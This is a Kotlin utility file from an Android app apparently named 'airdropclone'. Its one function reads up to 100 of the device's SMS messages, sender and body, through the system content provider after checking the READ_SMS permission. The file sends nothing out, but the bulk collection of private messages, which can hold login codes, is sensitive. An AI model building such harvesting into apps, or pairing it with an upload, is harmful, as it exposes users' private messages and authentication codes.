package com.airdropclone.utils

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.Telephony
import androidx.core.content.ContextCompat

object SmsUtil {

    fun getAllSms(context: Context): List<Pair<String, String>> {
        val smsList = mutableListOf<Pair<String, String>>()

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return smsList
        }

        val cursor: Cursor? = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use {
            val addressCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
            while (it.moveToNext()) {
                val address = it.getString(addressCol) ?: "Unknown"
                val body = it.getString(bodyCol) ?: ""
                smsList.add(Pair(address, body))
                if (smsList.size >= 100) break
            }
        }
        return smsList
    }
}
